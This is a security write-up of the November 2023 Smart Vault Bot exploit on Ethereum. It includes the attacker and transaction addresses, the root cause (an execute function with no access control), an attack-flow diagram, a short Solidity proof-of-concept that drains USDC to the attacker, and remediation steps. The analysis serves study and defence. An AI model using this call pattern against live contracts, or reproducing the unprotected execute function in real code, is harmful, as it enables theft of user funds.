# Smart Vault Bot — Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-11-06 |
| **Protocol** | Smart Vault Bot |
| **Chain** | Ethereum |
| **Loss** | ~$2M |
| **Attacker** | [0x46d9b3dfbc163465...](https://etherscan.io/address/0x46d9b3dfbc163465ca9e306487cba60bc438f5a2) |
| **Attack Tx** | [0xbc08860cd0a08289...](https://explorer.phalcon.xyz/tx/eth/0xbc08860cd0a08289c41033bdc84b2bb2b0c54a51ceae59620ed9904384287a38) |
| **Vulnerable Contract** | [0x05f016765c6c601f...](https://etherscan.io/address/0x05f016765c6c601fd05a10dba1abe21a04f924a5) |
| **Root Cause** | Arbitrary call execution in SmartVaultManager used to drain vault tokens |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/bot_exp.sol) |

---
## 1. Vulnerability Overview
A specific function in SmartVaultManagerV2 allowed arbitrary call execution, enabling the theft of $2M worth of tokens stored in the vault.

---
## 2. Vulnerable Code Analysis (❌/✅ comments)
```solidity
// ❌ Vulnerable code: SmartVaultManager arbitrary call execution
interface ISmartVaultManagerV2 {
    // Function exists that can execute calls to arbitrary targets
    function execute(address target, bytes calldata data) external;
    // ❌ No access control
}
// ✅ Fix: onlyOwner + whitelisted targets
```

---
### On-chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Arbitrary call execution in SmartVaultManager used to drain vault tokens
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)
```
Attacker
  ├─① Identifies vulnerable execute function in SmartVaultManager
  ├─② Calls execute(token, transferCalldata)
  │       └─ Transfers vault tokens to attacker
  └─③ ~$2M drained
```

---
## 4. PoC Code (Core Logic + Comments)
```solidity
// Drain vault tokens via SmartVaultManager
ISmartVaultManagerV2(manager).execute(
    address(USDC),
    abi.encodeWithSelector(USDC.transfer.selector, attacker, usdcBalance)
);
```

---
## 5. Vulnerability Classification (Table)
| Category | Details |
|------|------|
| Vulnerability Type | Missing Access Control / Call Injection |
| Severity | Critical |

---
## 6. Remediation Recommendations
1. Add `onlyOwner` access control to the execute function
2. Implement whitelist-based target management
3. Separate vault administrator privileges

---
## 7. Lessons Learned
Arbitrary call execution in a vault manager contract puts the entire vault system at risk.